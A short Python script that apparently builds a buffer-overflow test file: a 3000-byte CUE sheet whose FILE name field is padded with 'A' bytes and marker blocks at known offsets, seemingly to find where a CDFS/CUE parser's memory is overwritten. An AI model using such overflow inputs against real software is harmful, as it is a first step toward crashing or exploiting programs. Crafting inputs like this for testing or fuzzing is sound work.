#!/usr/bin/env python3
import struct

# Use different printable characters at known offsets
payload = b"A" * 1000
payload += b"BBBBBBBB"  # Marker at 1000
payload += b"A" * 500
payload += b"CCCCCCCC"  # Marker at 1508
payload += b"A" * 500
payload += b"DDDDDDDD"  # Marker at 2008
payload += b"A" * 500
payload += b"EEEEEEEE"  # Marker at 2508
payload += b"A" * (3000 - len(payload))

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
